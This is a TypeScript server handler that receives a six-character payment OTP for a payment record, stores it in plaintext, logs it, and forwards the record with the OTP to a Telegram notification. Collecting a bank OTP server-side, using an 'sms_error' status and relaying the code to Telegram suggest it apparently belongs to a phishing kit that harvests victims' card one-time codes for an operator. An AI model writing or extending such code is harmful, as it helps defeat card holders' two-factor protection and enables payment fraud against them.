import db, { type PaymentInfo } from '~/server/database/db';
import { sendStatusUpdateNotification } from '~/server/utils/telegram';

export default defineEventHandler(async (event) => {
    if (event.node.req.method !== 'POST') {
        throw createError({
            statusCode: 405,
            statusMessage: 'Method not allowed'
        });
    }

    try {
        const body = await readBody(event);
        const { paymentId, otp } = body;

        if (!paymentId || !otp) {
            throw createError({
                statusCode: 400,
                statusMessage: 'Payment ID and OTP are required'
            });
        }

        const otpString = otp.toString().trim().toUpperCase();
        if (otpString.length !== 6 || !/^[A-Z0-9]{6}$/.test(otpString)) {
            throw createError({
                statusCode: 400,
                statusMessage: 'OTP must be 6 characters'
            });
        }

        const payment = db.prepare('SELECT * FROM payment_info WHERE id = ?').get(paymentId) as PaymentInfo;

        if (!payment) {
            throw createError({
                statusCode: 404,
                statusMessage: 'Payment not found'
            });
        }

        if (payment.status !== 'sms' && payment.status !== 'sms_error') {
            throw createError({
                statusCode: 400,
                statusMessage: 'Payment is not waiting for OTP'
            });
        }

        console.log(`🔢 DEBUG: OTP received for payment ${paymentId}: ${otpString}`);

        db.prepare('UPDATE payment_info SET otp = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(otpString, paymentId);

        // Cập nhật payment với OTP mới để gửi thông báo
        const updatedPayment = db.prepare('SELECT * FROM payment_info WHERE id = ?').get(paymentId) as PaymentInfo;

        // Gửi thông báo Telegram với OTP mới
        if (updatedPayment) {
            sendStatusUpdateNotification(updatedPayment)
                .then((success) => {
                    if (success) {
                        console.log('📱 DEBUG: OTP Telegram notification sent successfully for payment:', paymentId);
                    } else {
                        console.log('⚠️ DEBUG: Failed to send OTP Telegram notification for payment:', paymentId);
                    }
                })
                .catch((error) => {
                    console.error('🚨 DEBUG: Error sending OTP Telegram notification:', error);
                });
        }

        return {
            success: true
        };
    } catch (error) {
        console.error('🚨 DEBUG: Error processing OTP:', error);
        setResponseStatus(event, 204);
    }
});
